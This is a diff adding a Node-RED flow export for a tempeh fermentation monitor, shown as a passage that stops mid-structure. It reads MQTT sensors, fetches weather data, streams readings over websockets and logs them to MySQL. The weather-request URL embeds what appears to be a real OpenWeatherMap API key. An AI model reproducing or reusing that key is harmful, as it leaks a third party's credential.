@@ -1,0 +1,3367 @@
+[
+    {
+        "id": "0452eaca2b12b1a3",
+        "type": "tab",
+        "label": "Tempeh UMAMI Actualizado",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "9f3451217b0b159a",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "2ea81c9a7e562beb",
+            "652eb6f460a4da94",
+            "d0cbde8e227a814a",
+            "fad5a0e23a241fdd",
+            "5025f41fe68ad453",
+            "30062726f7936fa4",
+            "ce0f428112a875ea",
+            "7e5c92ebbc4b29fe",
+            "2449ec1823ea2b2b"
+        ],
+        "x": 14,
+        "y": 19,
+        "w": 2492,
+        "h": 162
+    },
+    {
+        "id": "5fde6e111dd41a9a",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "80b15a259d9d585b",
+            "7ada9c382e4a51d6",
+            "fa35f6382cbcf03d",
+            "1864bd5ac12e881e",
+            "51f62f85b64fc370",
+            "079b4cd1f3948ce8",
+            "ac5291e497534d3d"
+        ],
+        "x": 4,
+        "y": 199,
+        "w": 2082,
+        "h": 82
+    },
+    {
+        "id": "90dcf03a0cb95e58",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "name": "",
+        "style": {
+            "label": true
+        },
+        "nodes": [
+            "d3a04488c74d2e76",
+            "90bb23265eb14f33",
+            "92992acd50baa589",
+            "dbe993b89c0379a3",
+            "30c299dcca04943f",
+            "4f7fddace2e57990",
+            "7d88b79f7d832dc2"
+        ],
+        "x": 14,
+        "y": 299,
+        "w": 1272,
+        "h": 182
+    },
+    {
+        "id": "1920b6e92860afc3",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "d960da3429791e0b",
+            "7841aa7f0e1592d5",
+            "d7fc03e5be1a9015",
+            "df70c9c911c4e94f",
+            "63aeee5e7072ffb7",
+            "d2b04060cfb6dc62",
+            "5d5c392d5c1674e7"
+        ],
+        "x": 14,
+        "y": 499,
+        "w": 1212,
+        "h": 182
+    },
+    {
+        "id": "ba71452c0526a486",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "0257bf210260a698",
+            "dda0648587784ea2",
+            "32a9746c55299d3f",
+            "d76f81af94822c9b",
+            "949942da3606dfda",
+            "b132d80ffbdfc576",
+            "0a457a05c4bd470e"
+        ],
+        "x": 14,
+        "y": 699,
+        "w": 1212,
+        "h": 182
+    },
+    {
+        "id": "f50d9e7eb8bb8de0",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "e2cfe189227dafc3",
+            "c7c3847e66475eda",
+            "4f8d30a2620c8d35",
+            "6f5f8a1d25e4b920",
+            "0d21da4df2118bb2",
+            "ee1826862b5b646d",
+            "edd04596e686c165"
+        ],
+        "x": 14,
+        "y": 899,
+        "w": 1332,
+        "h": 182
+    },
+    {
+        "id": "d01394a8f2ed9312",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "37bc8745a4f489eb",
+            "f779571c713c9273"
+        ],
+        "x": 1194,
+        "y": 619,
+        "w": 532,
+        "h": 82
+    },
+    {
+        "id": "e0f5f16cc75fee30",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "285f2f5547179b76",
+            "a42fb56faf74e319",
+            "c88be41ff3bbe202",
+            "bc2e401b348b9954",
+            "262de9fb64d305b7",
+            "f9ab28c82f785ef3",
+            "2824033e0f20d448",
+            "a6317bc05ff586b2",
+            "feb56fcca0148fc0",
+            "c8926ea75728cc59",
+            "36be3b2d6c160fbb",
+            "aec717e0ed467170",
+            "657f811538f97143",
+            "d412c3f80c75edde",
+            "d27b22e8fae78810",
+            "0d19c6b25113dfb8",
+            "d3c451af9e03d2c9",
+            "f04858843a23e490",
+            "c61c7193ce269b38",
+            "f2d74c2e9f4ad884",
+            "af2e1ed43c59d2fd",
+            "ed0556b99708c233",
+            "9ca8c02911dc9008",
+            "0474578d1f95563f",
+            "71ccd4092de49a0c",
+            "97742ac577f141a2",
+            "ede57da94f62897c",
+            "bbd68721e57bd083",
+            "c52648f3c7cdc78f",
+            "7b1f6e28026cb37e",
+            "c6250c559718f47a"
+        ],
+        "x": 14,
+        "y": 1099,
+        "w": 2012,
+        "h": 702
+    },
+    {
+        "id": "42e72904bc236b7d",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "5221b6b1b60393ea",
+            "a40b3a8136096cae",
+            "5f814e05cba4b4c2"
+        ],
+        "x": 2594,
+        "y": 319,
+        "w": 752,
+        "h": 82
+    },
+    {
+        "id": "a788b397b1633ff0",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "062888e53858ac6c",
+            "e98478a36d9fdb13",
+            "d30ae282db20f44b"
+        ],
+        "x": 2594,
+        "y": 19,
+        "w": 692,
+        "h": 82
+    },
+    {
+        "id": "81115cc2d92860c3",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "85f47c81d7567108",
+            "9665f410e798b112",
+            "1a89c75b20c85ace"
+        ],
+        "x": 2594,
+        "y": 119,
+        "w": 612,
+        "h": 82
+    },
+    {
+        "id": "05055b15566ae5fd",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "f9c93eebbe94232f",
+            "5c95b426c7384bd7",
+            "6773a73d2fe8585c"
+        ],
+        "x": 2594,
+        "y": 219,
+        "w": 672,
+        "h": 82
+    },
+    {
+        "id": "2fb643469648ab0d",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "084c4a28669c7c83",
+            "9cb3b070c950e2ba",
+            "7a75839e7e24b2ca"
+        ],
+        "x": 3454,
+        "y": 119,
+        "w": 492,
+        "h": 162
+    },
+    {
+        "id": "c99cd395087dcd62",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "7542220330bcd432",
+            "b2d342a8f67d0394",
+            "4c925639fbe5719f",
+            "ecefde7caf50b685",
+            "a0219bd8d92a41c5",
+            "6e53103644bb73ae",
+            "d4c7da80c5baceda",
+            "7f0e781feb9be3a8",
+            "3f62bdae39796d3c",
+            "93e2a214272ae291",
+            "ea22e8aae9ef4062",
+            "da614041e9f50c07",
+            "6a5961c92949ca03",
+            "0c07726808bad07a",
+            "f2f6c47570fcdcc8",
+            "018aa44db8715e2c",
+            "fbeb4c9b5eb36dc9"
+        ],
+        "x": 2594,
+        "y": 419,
+        "w": 1352,
+        "h": 362
+    },
+    {
+        "id": "0580de529f2ac7c9",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "c541822eada6fe91",
+            "352c568987ffebe6",
+            "3a96e87824809f13",
+            "65636dbfd7de2154",
+            "137d77926decc77e",
+            "72ccf46be2970f04",
+            "3ce3515f11984364",
+            "a5ea656df950c33e",
+            "e73c3fb058551425",
+            "075b4fdedfbf804e",
+            "73602fcb9b655d0a",
+            "72e556e10dab3bd7",
+            "0a53da4494bf0fef",
+            "5e7f18b03beea055",
+            "49ae108ea787ce8a",
+            "f06c14eabde42bd4",
+            "3f3f6feb99d66031"
+        ],
+        "x": 2594,
+        "y": 919,
+        "w": 1652,
+        "h": 262
+    },
+    {
+        "id": "a75f0cd5305c1521",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "c6ac5901ac8dbfef",
+            "0d9db733414cf42b",
+            "18a27b2f7217be72",
+            "f70a6917eb2520f3",
+            "65d6ca06db27ed08"
+        ],
+        "x": 2574,
+        "y": 1379,
+        "w": 1552,
+        "h": 82
+    },
+    {
+        "id": "595316d8d88582bf",
+        "type": "group",
+        "z": "0452eaca2b12b1a3",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "156abb3d8c2199c6",
+            "f98b9d203e1b9857",
+            "fb8b824dee1a44c5",
+            "f26c72bc4a8a9233"
+        ],
+        "x": 1404,
+        "y": 839,
+        "w": 1102,
+        "h": 82
+    },
+    {
+        "id": "7ada9c382e4a51d6",
+        "type": "inject",
+        "z": "0452eaca2b12b1a3",
+        "g": "5fde6e111dd41a9a",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "300",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 130,
+        "y": 240,
+        "wires": [
+            [
+                "80b15a259d9d585b"
+            ]
+        ]
+    },
+    {
+        "id": "80b15a259d9d585b",
+        "type": "http request",
+        "z": "0452eaca2b12b1a3",
+        "g": "5fde6e111dd41a9a",
+        "name": "",
+        "method": "GET",
+        "ret": "txt",
+        "paytoqs": "ignore",
+        "url": "https://api.openweathermap.org/data/2.5/weather?lat=-32.8905&lon=-68.8443&appid=a72f570e317b7b637daf66ba45a3affc&units=metric",
+        "tls": "",
+        "persist": false,
+        "proxy": "",
+        "insecureHTTPParser": false,
+        "authType": "",
+        "senderr": false,
+        "headers": [],
+        "x": 310,
+        "y": 240,
+        "wires": [
+            [
+                "fa35f6382cbcf03d"
+            ]
+        ]
+    },
+    {
+        "id": "fa35f6382cbcf03d",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "5fde6e111dd41a9a",
+        "name": "Procesar Pronostico",
+        "func": "let data = JSON.parse(msg.payload); // si usás el nodo http request en modo texto, sino directamente msg.payload\nlet fecha = new Date();\n\nlet month = fecha.getMonth() + 1;\nlet estacion_ano = \"\";\n\nif (month >= 9 && month <= 11) {\n    estacion_ano = \"Primavera\";\n} else if (month >= 12 || month <= 2) {\n    estacion_ano = \"Verano\";\n} else if (month >= 3 && month <= 5) {\n    estacion_ano = \"Otoño\";\n} else if (month >= 6 && month <= 8) {\n    estacion_ano = \"Invierno\";\n}\n\nmsg.payload = {\n    temperatura: data.main.temp,\n    humedad: data.main.humidity,\n    descripcion: data.weather[0].description,\n    icono: data.weather[0].icon,\n    viento: data.wind.speed,\n    ciudad: data.name,\n    estacion_ano: estacion_ano\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 560,
+        "y": 240,
+        "wires": [
+            [
+                "1864bd5ac12e881e"
+            ]
+        ]
+    },
+    {
+        "id": "d0cbde8e227a814a",
+        "type": "switch",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "Iniciar/Pausar Proceso",
+        "property": "payload.accion",
+        "propertyType": "msg",
+        "rules": [
+            {
+                "t": "eq",
+                "v": "\"start\"",
+                "vt": "jsonata"
+            },
+            {
+                "t": "eq",
+                "v": "\"stop\"",
+                "vt": "jsonata"
+            }
+        ],
+        "checkall": "false",
+        "repair": false,
+        "outputs": 2,
+        "x": 700,
+        "y": 60,
+        "wires": [
+            [
+                "fad5a0e23a241fdd"
+            ],
+            [
+                "5025f41fe68ad453"
+            ]
+        ]
+    },
+    {
+        "id": "fad5a0e23a241fdd",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "Registrar Registro_Actividad BD",
+        "func": "// Function: Crear Registro_Actividad\nlet now = new Date();\nmsg.topic = `\n  INSERT INTO registro_actividad (Fecha_Registro)\n  VALUES (?)\n`;\nmsg.payload = [now.toISOString().slice(0, 19).replace('T', ' ')]; // formato DATETIME de MySQL\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1210,
+        "y": 60,
+        "wires": [
+            [
+                "30062726f7936fa4"
+            ]
+        ]
+    },
+    {
+        "id": "30062726f7936fa4",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 1550,
+        "y": 60,
+        "wires": [
+            [
+                "7e5c92ebbc4b29fe"
+            ]
+        ]
+    },
+    {
+        "id": "652eb6f460a4da94",
+        "type": "websocket in",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "WS IN Iniciar/Pausar Proceso",
+        "server": "c33d24eeb07e1b55",
+        "client": "",
+        "x": 160,
+        "y": 60,
+        "wires": [
+            [
+                "2ea81c9a7e562beb"
+            ]
+        ]
+    },
+    {
+        "id": "2ea81c9a7e562beb",
+        "type": "json",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 430,
+        "y": 60,
+        "wires": [
+            [
+                "d0cbde8e227a814a"
+            ]
+        ]
+    },
+    {
+        "id": "7e5c92ebbc4b29fe",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "Guardar ID Proceso en Curso",
+        "func": "let insertId = msg.payload && msg.payload.insertId;\n\nif (!insertId) {\n    node.error(\"No se encontró insertId en msg.payload\");\n    return null;\n}\n\nglobal.set(\"ID_Registro_Actual\", insertId);\n\n// Marcar que el proceso está activo\nglobal.set(\"Proceso_Activo\", true);\n\nglobal.set(\"Hora_Inicio\", Date.now());  // Guardamos timestamp\n\nnode.status({ fill: \"green\", shape: \"dot\", text: \"ID guardado: \" + insertId });\nreturn msg;",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1950,
+        "y": 60,
+        "wires": [
+            [
+                "2449ec1823ea2b2b"
+            ]
+        ]
+    },
+    {
+        "id": "1864bd5ac12e881e",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "5fde6e111dd41a9a",
+        "name": "Agregar ID_Registro_Actual_Clima",
+        "func": "let idRegistro = global.get(\"ID_Registro_Actual\");\nif (!idRegistro) {\n    node.error(\"No hay proceso activo (ID_Registro_Actual no definido)\");\n    return null;\n}\nmsg.payload.ID_Registro = idRegistro;\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 940,
+        "y": 240,
+        "wires": [
+            [
+                "51f62f85b64fc370"
+            ]
+        ]
+    },
+    {
+        "id": "079b4cd1f3948ce8",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "5fde6e111dd41a9a",
+        "name": "Registrar Clima BD",
+        "func": "const payload = msg.payload;\n\nmsg.topic = `\n  INSERT INTO datos_climaticos \n  (Fecha_Registro, Temperatura_Ambiental, Humedad, Descripcion, Ciudad, Velocidad_Viento, Estacion_Ano, ID_Registro)\n  VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?);\n`;\n\nmsg.payload = [\n  payload.temperatura,\n  payload.humedad,\n  payload.descripcion,\n  payload.ciudad,\n  payload.viento,\n  payload.estacion_ano,  // <-- agregá este campo en el payload antes\n  payload.ID_Registro\n];\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1710,
+        "y": 240,
+        "wires": [
+            [
+                "ac5291e497534d3d"
+            ]
+        ]
+    },
+    {
+        "id": "ac5291e497534d3d",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "5fde6e111dd41a9a",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 2010,
+        "y": 240,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "2449ec1823ea2b2b",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "Verificar Estado Proceso",
+        "func": "let activo = global.get(\"Proceso_Activo\");\n\nif (activo === true) {\n    // El proceso está activo\n    node.status({ fill: \"green\", shape: \"dot\", text: \"Proceso activo\" });\n    // Continuar con el flujo\n    return msg;\n} else {\n    // El proceso no está activo o no existe la variable\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso inactivo\" });\n    // Detener el flujo\n    return null;\n}\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 2370,
+        "y": 60,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "5025f41fe68ad453",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "Detener Guardado Proceso Actual",
+        "func": "// Poner la variable de estado en false para indicar que el proceso está pausado\nglobal.set(\"Proceso_Activo\", false);\n\nnode.status({ fill: \"red\", shape: \"ring\", text: \"Proceso pausado\" });\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1240,
+        "y": 140,
+        "wires": [
+            [
+                "ce0f428112a875ea"
+            ]
+        ]
+    },
+    {
+        "id": "ce0f428112a875ea",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "9f3451217b0b159a",
+        "name": "Verificar Estado Proceso",
+        "func": "let activo = global.get(\"Proceso_Activo\");\n\nif (activo === true) {\n    // El proceso está activo\n    node.status({ fill: \"green\", shape: \"dot\", text: \"Proceso activo\" });\n    // Continuar con el flujo\n    return msg;\n} else {\n    // El proceso no está activo o no existe la variable\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso inactivo\" });\n    // Detener el flujo\n    return null;\n}\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1610,
+        "y": 140,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "51f62f85b64fc370",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "5fde6e111dd41a9a",
+        "name": "Verificar Proceso Activo o Pausado",
+        "func": "let activo = global.get(\"Proceso_Activo\");\n\nif (activo === true) {\n    return msg;\n} else {\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso inactivo, no guardo datos\" });\n    return null;\n}\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1340,
+        "y": 240,
+        "wires": [
+            [
+                "079b4cd1f3948ce8"
+            ]
+        ]
+    },
+    {
+        "id": "d3a04488c74d2e76",
+        "type": "mqtt in",
+        "z": "0452eaca2b12b1a3",
+        "g": "90dcf03a0cb95e58",
+        "name": "Temperatura Ambiente",
+        "topic": "tempeh/tempAmb",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "e9302dc59ed18e5d",
+        "nl": false,
+        "rap": true,
+        "rh": 0,
+        "inputs": 0,
+        "x": 140,
+        "y": 340,
+        "wires": [
+            [
+                "90bb23265eb14f33",
+                "dbe993b89c0379a3"
+            ]
+        ]
+    },
+    {
+        "id": "90bb23265eb14f33",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "90dcf03a0cb95e58",
+        "name": "Procesa datos de temperatura",
+        "func": "var temp = parseFloat(msg.payload) || 0;\ndelete msg.parts;\n\nflow.set(\"temp\", temp);\nnode.warn(\"Temperatura: \" + temp);\n\nmsg.payload = {\n    variable: \"temperatura\",\n    valor: temp,\n    timestamp: new Date().toISOString()\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 410,
+        "y": 400,
+        "wires": [
+            [
+                "92992acd50baa589",
+                "4f7fddace2e57990"
+            ]
+        ]
+    },
+    {
+        "id": "92992acd50baa589",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "90dcf03a0cb95e58",
+        "name": "WS Out Temperatura Ambiente",
+        "server": "cf29aa31a0ead7a7",
+        "client": "",
+        "x": 410,
+        "y": 440,
+        "wires": []
+    },
+    {
+        "id": "d960da3429791e0b",
+        "type": "mqtt in",
+        "z": "0452eaca2b12b1a3",
+        "g": "1920b6e92860afc3",
+        "name": "Humedad Ambiente",
+        "topic": "tempeh/humAmb",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "e9302dc59ed18e5d",
+        "nl": false,
+        "rap": true,
+        "rh": 0,
+        "inputs": 0,
+        "x": 130,
+        "y": 540,
+        "wires": [
+            [
+                "7841aa7f0e1592d5",
+                "df70c9c911c4e94f"
+            ]
+        ]
+    },
+    {
+        "id": "7841aa7f0e1592d5",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "1920b6e92860afc3",
+        "name": "Procesa datos de humedad",
+        "func": "var humidity = parseFloat(msg.payload) || 0;\ndelete msg.parts;\n\nflow.set(\"humidity\", humidity);\nnode.warn(\"Humedad: \" + humidity);\n\nmsg.payload = {\n    variable: \"humedad\",\n    valor: humidity,\n    timestamp: new Date().toISOString()\n};\n\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "// El código añadido aquí se ejecutará una vez\n// cuando el nodo es iniciado.\n//return [\n   // { payload: null }\n//];",
+        "finalize": "",
+        "libs": [],
+        "x": 400,
+        "y": 600,
+        "wires": [
+            [
+                "d7fc03e5be1a9015",
+                "d2b04060cfb6dc62"
+            ]
+        ]
+    },
+    {
+        "id": "d7fc03e5be1a9015",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "1920b6e92860afc3",
+        "name": "WS Out Humedad Ambiente",
+        "server": "dc57c47d1bc1b1f6",
+        "client": "",
+        "x": 400,
+        "y": 640,
+        "wires": []
+    },
+    {
+        "id": "0257bf210260a698",
+        "type": "mqtt in",
+        "z": "0452eaca2b12b1a3",
+        "g": "ba71452c0526a486",
+        "name": "Calidad Aire",
+        "topic": "tempeh/co2",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "e9302dc59ed18e5d",
+        "nl": false,
+        "rap": true,
+        "rh": 0,
+        "inputs": 0,
+        "x": 110,
+        "y": 740,
+        "wires": [
+            [
+                "dda0648587784ea2",
+                "d76f81af94822c9b"
+            ]
+        ]
+    },
+    {
+        "id": "dda0648587784ea2",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "ba71452c0526a486",
+        "name": "Procesa datos de co2",
+        "func": "var co2 = parseFloat(msg.payload) || 0;\ndelete msg.parts;\nmsg.topic = \"tempeh/co2\";\nflow.set(\"co2\", co2);\nnode.warn(\"CO2: \" + co2);\nmsg.payload = {\n    variable: \"calidad_aire\",\n    valor: co2,\n    timestamp: new Date().toISOString()\n};\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "// El código añadido aquí se ejecutará una vez\n// cuando el nodo es iniciado.\n//return [\n   // { payload: null }\n//];",
+        "finalize": "",
+        "libs": [],
+        "x": 380,
+        "y": 800,
+        "wires": [
+            [
+                "32a9746c55299d3f",
+                "b132d80ffbdfc576"
+            ]
+        ]
+    },
+    {
+        "id": "32a9746c55299d3f",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "ba71452c0526a486",
+        "name": "WS Out Calidad Aire",
+        "server": "74a384dee911fb0b",
+        "client": "",
+        "x": 380,
+        "y": 840,
+        "wires": []
+    },
+    {
+        "id": "e2cfe189227dafc3",
+        "type": "mqtt in",
+        "z": "0452eaca2b12b1a3",
+        "g": "f50d9e7eb8bb8de0",
+        "name": "Temperatura Sonda",
+        "topic": "tempeh/tempSonda",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "e9302dc59ed18e5d",
+        "nl": false,
+        "rap": true,
+        "rh": 0,
+        "inputs": 0,
+        "x": 130,
+        "y": 940,
+        "wires": [
+            [
+                "c7c3847e66475eda",
+                "6f5f8a1d25e4b920"
+            ]
+        ]
+    },
+    {
+        "id": "c7c3847e66475eda",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "f50d9e7eb8bb8de0",
+        "name": "Procesa datos deTemperatura Sonda",
+        "func": "var tempProdu = parseFloat(msg.payload) || 0;\ndelete msg.parts;\nmsg.topic = \"tempeh/tempSonda\";\nflow.set(\"tempProdu\", tempProdu);\nnode.warn(\"Temperatura Sonda: \" + tempProdu);\nmsg.payload = {\n    variable: \"temperatura_sonda\",\n    valor: tempProdu,\n    timestamp: new Date().toISOString()\n};\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "// El código añadido aquí se ejecutará una vez\n// cuando el nodo es iniciado.\n//return [\n   // { payload: null }\n//];",
+        "finalize": "",
+        "libs": [],
+        "x": 430,
+        "y": 1000,
+        "wires": [
+            [
+                "4f8d30a2620c8d35",
+                "ee1826862b5b646d"
+            ]
+        ]
+    },
+    {
+        "id": "4f8d30a2620c8d35",
+        "type": "websocket out",
+        "z": "0452eaca2b12b1a3",
+        "g": "f50d9e7eb8bb8de0",
+        "name": "WS Out Temperatura Sonda",
+        "server": "e01c47bef6eaf7e7",
+        "client": "",
+        "x": 400,
+        "y": 1040,
+        "wires": []
+    },
+    {
+        "id": "37bc8745a4f489eb",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "d01394a8f2ed9312",
+        "name": "Verificar Proceso Activo o Pausado",
+        "func": "let activo = global.get(\"Proceso_Activo\");\n\nif (activo === true) {\n    return msg;\n} else {\n    node.status({ fill: \"red\", shape: \"ring\", text: \"Proceso inactivo, no guardo datos\" });\n    return null;\n}\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1360,
+        "y": 660,
+        "wires": [
+            [
+                "f779571c713c9273"
+            ]
+        ]
+    },
+    {
+        "id": "f779571c713c9273",
+        "type": "mysql",
+        "z": "0452eaca2b12b1a3",
+        "g": "d01394a8f2ed9312",
+        "mydb": "8b07e5f9a4e4a648",
+        "name": "DB",
+        "x": 1650,
+        "y": 660,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "285f2f5547179b76",
+        "type": "function",
+        "z": "0452eaca2b12b1a3",
+        "g": "e0f5f16cc75fee30",
+        "name": "Transformar true o false a Texto",
+        "func": "msg.estado = (msg.payload && msg.payload.state) ? \"encendido\" : \"apagado\";\nmsg.tipoActuador = \"Ventilador\"; // O el actuador correspondiente\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 950,
+        "y": 1320,
+        "wires": [
+            [
